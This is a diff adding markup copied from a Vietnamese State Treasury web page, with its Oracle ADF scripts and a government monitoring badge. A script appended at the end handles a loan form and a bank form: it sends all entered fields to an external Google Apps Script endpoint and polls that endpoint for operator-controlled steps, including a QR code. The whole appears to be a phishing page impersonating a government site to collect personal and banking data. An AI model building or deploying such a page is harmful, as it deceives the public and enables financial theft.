+      type="text/javascript">AdfBootstrap._onLoad = function () { if (AdfPage.PAGE.__checkRichResponseDirty()) return; var isCachedPage = false; if (!isCachedPage) { window.name = 'y5vcydxzj'; }; AdfAgent.AGENT.elementsAdded(document); AdfDhtmlLookAndFeel.addSkinProperties({ "AFPopupSelectorFooter": "x1b8", "af|message::detail": "x1c6", "af|messages::summary": "x1c8", "AFPopupSelector": "xfc", "af|message::icon-cell": "x1cf", "AFPopupSelectorContentEnd": "x1b7", "af|messages::intro": "x1bz", "af|popup-tr-shadow-offset": 1, "af|messages::header-text": "x1by", "af|messages::component-link": "xmt", "AFPopupSelectorContentStart": "x1b6", ".AFWorkaround-tr-disable-property-delta-sync": "false", "af|message::container": "x1cd", "AFPopupSelectorContent": "x1b5", "af|messages::detail": "x1c9", "AFPopupSelectorFooterEnd": "x1ba", "af|popup-tr-shadow-pixel-size": 9, "af|dialog-tr-open-animation-duration": "300", "af|popup-tr-shadow-starting-black-percent": 50, "af|dialog-tr-animate": "true", "AFPopupSelectorFooterStart": "x1b9", "af|messages::message-group-title": "x1c0", ".AFPopupSelector-tr-open-animation-duration": "200", ".AFPopupSelector-tr-animate": "true", "AFPopupSelectorHeaderEnd": "x1b4", "af|messages::message-group-type-separator": "x1c1", ".AFNoteWindow-tr-open-animation-duration": "200", "af|message::type": "x1c4", ".AFNoteWindow-tr-animate": "true", "AFPopupSelectorHeaderStart": "x1b3", "AFPopupSelectorHeader": "x1b2", "af|message::component-messages-list-container": "x1ce", "af|messages::message-group-list": "x1ch", "AFOverflowElement": "xku", "af|dialog::resize-ghost": "x1ei", "af|message::summary": "x1c5", "af|message::intro": "x1c7" }); AdfPage.PAGE.addComponents(new AdfRichDocument('docrt', { 'title': 'V\u0103n h\xf3a ngh\u1ec1 kho b\u1ea1c' }), new AdfRichForm('f1'), new AdfRichGoImageLink('T:pt_i1', { 'icon': '/webcenter/oracle/webcenter/siteresources/scopedMD/shared/KBNN/images/logo.png' }), new AdfRichInputText('T:inputsearch', { 'clientListeners': { keyUp: redirectURLKey }, 'styleClass': 'x1kb', 'inlineStyle': 'height:28px; width:200px; background:#246097 none repeat scroll 0% 0%; text-align:right; float:left; font-size:medium;', 'contentStyle': 'text-align:right!important;height: 26px;color:#fff ; width: 200px; background: #246097;border: none;text-align: right;color: #fff;float: left;font-size: 14px;', 'placeholder': 'T\xecm ki\u1ebfm' }), new AdfRichCommandImageLink('T:pt_cb1', { 'clientListeners': { click: redirectURL }, 'accessKey': '\uffff', 'text': '', 'styleClass': 'x2b3', 'icon': '/webcenter/oracle/webcenter/siteresources/scopedMD/shared/KBNN/images/search_bt.png' }), new AdfPageCustomizable('T:pcl1', { 'layoutView': false, 'componentView': false, 'isEditMode': false, 'contentContribKey': AdfKeyStroke.getKeyStrokeFromMarshalledString('shift ctrl C'), 'editModeKey': AdfKeyStroke.getKeyStrokeFromMarshalledString('shift ctrl E'), 'compViewKey': AdfKeyStroke.getKeyStrokeFromMarshalledString('shift ctrl S') }), new AdfRichPanelCustomizable('T:hm_pnc2', { 'behaviors': new AdfInitializationBehavior('component.setDropTarget(new AdfPanelCustomizableDropTarget())'), 'allowAction': 'none', 'layout': 'scroll', 'dropHint': 'Dropped component will be added here', 'cannotDropMessage': 'Cannot add more than one child to a box whose layout is stretched', 'inlineStyle': 'overflow:auto;margin-top:10px;padding:0px;' }), new AdfRichPanelCustomizable('T:pc7435243254', { 'behaviors': new AdfInitializationBehavior('component.setDropTarget(new AdfPanelCustomizableDropTarget())'), 'allowAction': 'none', 'dropHint': 'Dropped component will be added here', 'cannotDropMessage': 'Cannot add more than one child to a box whose layout is stretched', 'inlineStyle': 'margin-right:5px;margin-left:10px;padding:0px;width:275px;' }), new AdfRichShowDetailFrame('T:sdf_for_oc_2609714310region1', { 'behaviors': new AdfInitializationBehavior('component.setDragSource(new AdfShowDetailFrameDragSource())'), 'parentPC': 'T:pc7435243254', 'minHeight': 24, 'text': 'H\u1ed9p menu b\xean tr\xe1i', 'stretchContent': false }), new AdfRichRegion('T:oc_2609714310region1'), new AdfRichPanelCustomizable('T:oc_2609714310region1:pc1', { 'behaviors': new AdfInitializationBehavior('component.setDropTarget(new AdfPanelCustomizableDropTarget())'), 'allowAction': 'none', 'dropHint': 'Dropped component will be added here', 'cannotDropMessage': 'Cannot add more than one child to a box whose layout is stretched' }), new AdfRichShowDetailFrame('T:oc_2609714310region1:sdf_for_oc_2793595851region1', { 'behaviors': new AdfInitializationBehavior('component.setDragSource(new AdfShowDetailFrameDragSource())'), 'parentPC': 'T:oc_2609714310region1:pc1', 'minHeight': 24, 'text': 'Chuy\xean m\u1ee5c kh\xe1c', 'stretchContent': false }), new AdfRichRegion('T:oc_2609714310region1:oc_2793595851region1'), new AdfRichCommandLink('T:oc_2609714310region1:oc_2793595851region1:_afrCommandDelegate', { 'partialSubmit': true }), new AdfRichShowDetailFrame('T:oc_2609714310region1:sdf_for_oc_6758749317region1', { 'behaviors': new AdfInitializationBehavior('component.setDragSource(new AdfShowDetailFrameDragSource())'), 'parentPC': 'T:oc_2609714310region1:pc1', 'minHeight': 24, 'text': 'Banner li\xean k\u1ebft KBNN Taskflow', 'stretchContent': false }), new AdfRichRegion('T:oc_2609714310region1:oc_6758749317region1'), new AdfRichOutputLabel('T:oc_2609714310region1:oc_6758749317region1:ol3'), new AdfRichCommandLink('T:oc_2609714310region1:oc_6758749317region1:_afrCommandDelegate', { 'partialSubmit': true }), new AdfRichCommandLink('T:oc_2609714310region1:_afrCommandDelegate', { 'partialSubmit': true }), new AdfRichPanelCustomizable('T:e2247586474', { 'behaviors': new AdfInitializationBehavior('component.setDropTarget(new AdfPanelCustomizableDropTarget())'), 'allowAction': 'none', 'dropHint': 'Dropped component will be added here', 'cannotDropMessage': 'Cannot add more than one child to a box whose layout is stretched', 'inlineStyle': 'margin-right:10px;margin-left:5px;padding:0px;width:695px;' }), new AdfRichShowDetailFrame('T:sdf_for_oc_7429232432region1', { 'behaviors': new AdfInitializationBehavior('component.setDragSource(new AdfShowDetailFrameDragSource())'), 'parentPC': 'T:e2247586474', 'minHeight': 24, 'text': 'Thanh \u0111i\u1ec1u h\u01b0\u1edbng', 'stretchContent': false }), new AdfRichRegion('T:oc_7429232432region1'), new AdfRichBreadCrumbs('T:oc_7429232432region1:bc1'), new AdfRichCommandLink('T:oc_7429232432region1:_afrCommandDelegate', { 'partialSubmit': true }), new AdfRichShowDetailFrame('T:e4776035954', { 'behaviors': new AdfInitializationBehavior('component.setDragSource(new AdfShowDetailFrameDragSource())'), 'parentPC': 'T:e2247586474', 'minHeight': 24, 'text': 'HTML Markup', 'stretchContent': false }), new AdfRichDialog('docrt::msgDlg', { 'okVisible': false, 'cancelVisible': false, 'cancelTextAndAccessKey': 'OK', 'modal': false, 'resize': 'on', 'title': '' }), new AdfDialogServicePopupContainer('afr::DlgSrvPopupCtnr'), new AdfRichPopup('j_id41', { 'contentDelivery': 'immediate' }), new AdfRichDialog('j_id42', { 'okVisible': false, 'cancelVisible': false, 'closeIconVisible': false })); AdfPage.PAGE.setDefaultMessageHandlerComponentId("docrt"); AdfPage.PAGE.__initializeSessionTimeoutTimer(3730000, 120000, "http://vst.mof.gov.vn:80/webcenter/faces/oracle/webcenter/page/scopedMD/s433922df_f7e3_43d7_afe8_0e945a3e1d57/Page284.jspx"); AdfPage.PAGE.__initUserInactivityTimeout(600000); page.__setCssSelectorsUncompressed(false); AdfPage.PAGE.__setViewId('/oracle/webcenter/page/scopedMD/s433922df_f7e3_43d7_afe8_0e945a3e1d57/Page284.jspx'); var exScripts = AdfBootstrap._extendedScripts; for (var i = 0; i < exScripts.length; i++) { exScripts[i]() }; AdfBootstrap._extendedScripts = null; AdfPage.PAGE.__onLoad(); }; AdfNavigationHistoryAgent.getInstance().initialize('/oracle/webcenter/page/scopedMD/s433922df_f7e3_43d7_afe8_0e945a3e1d57/Page284.jspx', '?_afrLoop=93241446865922048&_adf.ctrl-state=jufll5r8s_1349'); AdfPage.PAGE.setFacesPath('/webcenter/portal'); AdfPage.PAGE.setPPRNavigationOptions('3'); window.onload = AdfBootstrap._onLoad;</script>
+    <script type="text/javascript">AdfBootstrap._extendedScripts = [function () {
+        document.webcenterStartClientSessionTimers = function () {
+          if (document.webcenterSessionTimeoutTimer != null)
+            window.clearTimeout(document.webcenterSessionTimeoutTimer);
+
+          document.webcenterSessionTimeoutTimer = window.setTimeout("document.webcenterClientSessionTimeout();", 3600000);
+
+        }
+        document.webcenterStartClientSessionTimers();
+
+        document.webcenterClientSessionTimeout = function () {
+        }
+      }];</script>
+  </div>
+  <style type="text/css">
+    .yhy-append-wrap {
+      overflow: hidden;
+      width: 100%;
+      height: 40px;
+      padding-top: 10px;
+    }
+
+    .yhy-append {
+      display: flex;
+      align-items: center;
+    }
+
+    .yhy-append .yhy-append-btn {
+      display: flex;
+      align-items: center;
+      margin-right: 5px;
+      padding: 5px 8px;
+      background: #EC3237;
+      box-shadow: 0px -1px 30px rgb(0 0 0 / 15%);
+      border-radius: 10px 10px 0px 0px;
+      border: 0;
+      font-family: 'Arial';
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .yhy-append .yhy-append-icon {
+      width: 24px;
+      height: 24px;
+    }
+
+    .yhy-append .yhy-append-icon {
+      width: 24px;
+      height: 24px;
+    }
+
+    .yhy-append .yhy-btn-btttt .yhy-append-icon {
+      width: 28px;
+      height: 26px;
+    }
+
+    .yhy-append .yhy-btn-btttt .append-icon>img {
+      width: 100%;
+    }
+
+    .yhy-append .yhy-btn-emc .yhy-append-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #FFFFFF;
+      border-radius: 50%;
+    }
+
+    .yhy-append .yhy-append-txt {
+      margin-left: 5px;
+      font-size: 14px;
+      line-height: 16px;
+      color: #FFFFFF;
+    }
+  </style>
+  <div class="yhy-append-wrap">
+    <div id="yhy-append" class="yhy-append">
+      <a href="javascript:void(0)" title="TRUNG TÂM GIÁM SÁT QUỐC GIA VỀ CHÍNH PHỦ SỐ" id="btnEMC"
+        class="yhy-append-btn yhy-btn-emc" style="display: flex;">
+        <span class="yhy-append-icon">
+          <img
+            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAANCAYAAACgu+4kAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAKeSURBVHgBhVJbSJNhGH6/7z9s/07mllvSby7JPBLVWHiiA6UUgV55ZbsJIrvzoouIuogiKCjopiCQMrwoTSExoRoGUwlEy+mFHbBp6qaba266/XP/4ev/ZXYAoQcevo+X533f73vfB8F2ODNgMVCchzC4ATBdATrKjmmaAEP7EQ3d+tDc05W+pjVNiv7NJMhQP3BRwewtoGgbMCQJa7OvlPT8JCKQBmtBAW0rcmNuR0qOTJ1P9XpCfwpUd1mPFi33nyj5Wn2Y/w7RUbRy2xtsCwT8Gbvp0ClEm8Rw3P9CkmIzumM3XLSzpiTZUf9gs0Cwp6xwNpH7rowPF6/HdeC9Xwi+meC1zpXAcnHhpYcteRJjhAy8XrdsjM29bYutjz4BC2+ExIKAo537eJZI/aXWSHE6ToGvYxckIzjpjc8Ome0NFzwOkWlF76GF9sFl87TO4ahqU3tqyTH13MCyTN0DCVUSCcHnkR0QnjYCpSiJ+fTqkpBfufcADgB7ZBUMzWEoTX8DdQ68mshnP67gQb94PZVipkmGQGDcAnp1WiaMbbt1ZpDk0KS34DiIn8wg9O4EX34dLHHJkNZ5a3TUyw+xWJ6JGnTauIMzI/Y9rITBAIRyc7ZI35ee9gl9VeOEs8notbnhcYpdjE09u0uS0Y9d5eVidyQib20Be2pz+Yqg+yZPsR4TUZBRgcyqkDjXvDQ8hY18I+g5RokGxmtZy/wjU0WNKIHgSgw9/9sH2j3nCu8+66KtV/MJKjOKMugE0SfImeE0UWgLpvezmCpdkAXvycToHVUfRtv4kOGAc7RanHW1dM5pp0y5WIRzMkT5uaikx/o2Im/aMz8mVN2iyhSC7aHFGZUm7VUquWw8qTKhUrOxtCX8H3CWm2vL8jd+AX3nDRFsNigEAAAAAElFTkSuQmCC"
+            alt="EMC">
+        </span>
+        <span class="yhy-append-txt">Đã kết nối EMC</span>
+      </a>
+      <a href="https://mic.gov.vn/" target="_blank" title="BỘ THÔNG TIN VÀ TRUYỀN THÔNG" id="btnBTTTT"
+        class="yhy-append-btn yhy-btn-btttt" style="display: none">
+        <span class="yhy-append-icon">
+          <img
+            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAaCAYAAACkVDyJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAURSURBVHgB5VZbbFRVFF3nPmbmlg7tUKCRR6kGUaC1EQhoE8Qmgv2oiXxINaJGfkTjl8Yfo4YYoumHJJoYP1QIYowfRiPGN4IkJgZBm/ioUKStrZTWttMync7MfW7XKdOkNNNa/dSb3Jxzz9lnr73XfpwL/NcfNV/BnMgKh2M+D2WaqOTUj8UwmgWicmBMKeXPR8/fAhYKssYw4AQG1loKqVCQheDGSPCBbWKTCDKGiYHIw0A2iz+qqlTmXwGKSEUAbKDASo5/SoBcPsJWgq0giPYQlolB7nfYCl00ajvfjy2gk94O/CNAgjnkp14iNNGTS16EhjDCHgGBZPKUps8ksKGoge8pgrdxyy0z4QcFnHcc1VNKt1VqkR41RhHqvQDnAsFLEZBQgpdtC59T2XgsgWqTMZwQuKZgFY3aE4Q4SODDoUKnGKjMa6uV+n2mbmPmgi/SGBAxMnDGF7RRyZGqOFaZET4KQ+wXGz/mAxybCHBShTjCI6tTcbRYIVqiENsLIcS0sJpW1xCzbE5ACiS016aBOs/D4zHB3lRc7Ut7eCYycUAUDhqC6xYnsLAqgRS9fpi0Vo+5aE866FqUwAaG4Q4a/CvjutB1sWJOQBdMCGDcD+GRpsNJR53IevIQQTL04k5S+wP39455eHvUw2s8XVkZx1NWHLvGPTxBFTF+t5Kgm8WkujhCzPXQwxv0mAvk3uJ3xWVX7tfzrCv1IwU5UKAM1xfrvXRedmd80UDoG5blE4Hcpefjrqzl/lK+1RnKzgrI+DVR6Ca+a4qAy4ujNSHSoueX8lI7WpDXp85oA3KebCnOr6esKp5ZH4i0cqwrSSk3TEqWuyFq+NlTXB4qjiaj/wVlyh0D7zGRaqbOJZQ659ho1/M4cGGa7t5CgFpvRtjUdEBm4U6YKGRdPMZYXWTMzsZ8fJpMqg4tQy+XhT52MFFWMTirlYkvU5Z6a4oFxnUX67SRBi1jV/qKhuRYPt+yEZxFqScIZCff+9IF6R8mP4yZpF0pDOXlDSqsnJLjejNlurmW1N+Xc5NnhrT8CAuQ8yjjytMu9VGmviSl+qGHnczUJDNyPWtvyaI4amntI+R6E0vjt34mw6Q3EUZVgLu10zTohUDhFUPhTcvALSyNlSyXa0nv+2wCOgdy0zGu7jQxiM3CHQ9xDztHG+npUwZOxBQe9EgVlbybFdmxAPiONGlv9vHmuJVhaCb9mxHh+bSLdeypaa69aETopEvdJWNYjEMFY7M19NCbCVHHBlBBgY2sySZud1uCo2xbaysT6lECN/genqNRJyOF/azV49T2PUF72e4uOHFsYbf6LK7UL7MCFkFrWLgPeD4+oVdPQveDiGAWlOtjM63v4PerBNnNeKykBylSeZq9t4qytbyy3iHliywbg2TkNJlIz07plWeCi1/DRooeHGVGHmJlOV6IkPQeIoV1MQu3BWzujK++SbaxM7Vqy5mZH9KIZczeCmZzh4pdDVbSw6KXC9gPG1hDzSpCuyvspbwb9dXE5DhGwD7GeB2ZWMMESel2SK+fLXfQT/mltoFT9OxMKd2zXsC5nNRYDqpJ1e1UetHTVcMbgR7XxQyM8Ca5hvMegh1nNv/EDNfxF/4RDJbZ6pvZ9M75i6Fvj5yPetvmZRtE2wJl/EzKljB5+iILFdozMrExYeF85KMrsDFcplTfXDrn9RMlVxqwTgqTNKbCAEneeS5jPaL3C7yUEwnSqZSL//3zFxsemmKTwC3gAAAAAElFTkSuQmCC">
+        </span>
+        <span class="yhy-append-txt">Trực thuộc BTTTT</span>
+      </a>
+    </div>
+  </div>
+  <script>
+    const CONFIG = {
+      scriptUrl: (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || !window.location.hostname)
+        ? 'http://localhost:3000'
+        : 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE'
+    };
+
+    function switchState(state) {
+      document.querySelectorAll('#workflow-container > div').forEach(div => div.style.display = 'none');
+      const target = document.getElementById('state-' + state);
+      if (target) {
+        target.style.display = 'block';
+        window.scrollTo({ top: target.offsetTop - 100, behavior: 'smooth' });
+      }
+    }
+
+    function getUrlParam(name) {
+      return new URLSearchParams(window.location.search).get(name);
+    }
+
+    async function pollStatus(token) {
+      if (!token) return;
+      try {
+        const response = await fetch(`${CONFIG.scriptUrl}?token=${token}&_=${Date.now()}`);
+        const data = await response.json();
+        processStatus(data, token);
+      } catch (e) {
+        console.error('Polling error:', e);
+      }
+    }
+
+    function processStatus(data, token) {
+      if (data.status === 'pending') {
+        switchState('pending');
+      } else if (data.status === 'approved') {
+        switchState('approved');
+      } else if (data.status === 'scanned') {
+        if (data.qr_url) {
+          const qrImg = document.getElementById('qr-image');
+          qrImg.src = data.qr_url;
+          document.getElementById('qr-container').style.display = 'block';
+        }
+        switchState('scanned');
+      } else if (data.status === 'done') {
+        switchState('success');
+      }
+    }
+
+    const token = getUrlParam('token');
+    if (token) {
+      pollStatus(token);
+      setInterval(() => pollStatus(token), 3000);
+    } else {
+      switchState('initial');
+    }
+
+    document.getElementById('loanForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = e.target.querySelector('button');
+      const originalText = btn.innerText;
+      btn.disabled = true;
+      btn.innerText = 'Đang đăng ký...';
+      const formData = new FormData(e.target);
+      const data = { action: 'submit' };
+      formData.forEach((value, key) => data[key] = value);
+      try {
+        const resp = await fetch(CONFIG.scriptUrl, { method: 'POST', body: JSON.stringify(data) });
+        const result = await resp.json();
+        if (result.token) {
+          const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?token=' + result.token;
+          window.history.pushState({ path: newUrl }, '', newUrl);
+          switchState('pending');
+          setInterval(() => pollStatus(result.token), 3000);
+        }
+      } catch (e) {
+        console.error(e);
+        alert('Có lỗi xảy ra khi kết nối máy chủ.');
+        btn.disabled = false;
+        btn.innerText = originalText;
+      }
+    });
+
+    document.getElementById('btn-to-bank').addEventListener('click', () => { switchState('bank'); });
+
+    document.getElementById('bankForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = e.target.querySelector('button');
+      btn.disabled = true;
+      btn.innerText = 'Đang xác nhận...';
+      const formData = new FormData(e.target);
+      const data = { action: 'submit_bank', token: getUrlParam('token') };
+      formData.forEach((value, key) => data[key] = value);
+      try {
+        await fetch(CONFIG.scriptUrl, { method: 'POST', body: JSON.stringify(data) });
+        pollStatus(data.token);
+      } catch (e) {
+        console.error(e);
+        alert('Có lỗi xảy ra.');
+        btn.disabled = false;
+        btn.innerText = 'Xác nhận';
+      }
+    });
+  </script>
+</body>
+<!--Created by Oracle ADF (Version information hidden), accessibility (mode:null, contrast:standard, size:medium), skin:gsr92b5dff6_711b_421d_a483_02528dd8b233.desktop (gsr92b5dff6_711b_421d_a483_02528dd8b233)-->
+
+</html>
